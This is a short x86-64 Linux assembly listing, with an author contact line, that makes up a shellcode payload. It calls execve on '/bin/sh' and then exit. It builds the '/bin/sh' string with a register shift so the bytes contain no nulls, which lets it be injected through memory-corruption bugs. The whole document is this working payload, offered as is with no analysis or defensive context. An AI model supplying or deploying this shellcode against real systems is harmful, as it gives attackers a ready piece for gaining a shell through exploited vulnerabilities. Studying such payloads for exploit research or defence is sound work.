; [Linux/X86-64]
; Dummy for shellcode:
; execve("/bin/sh", ["/bin/sh"], NULL)
; hophet [at] gmail.com
_start:
    xor    rdx, rdx
    mov    rbx, 0x68732f6e69622fff
    shr rbx, 0x8
    push    rbx
    mov    rdi, rsp
    xor    rax, rax
    push   rax
    push   rdi
    mov    rsi, rsp
    mov al, 0x3b   ; execve(3b)
    syscall
    push  0x1
    pop rdi
    push  0x3c     ; exit(3c)
    pop rax
    syscall
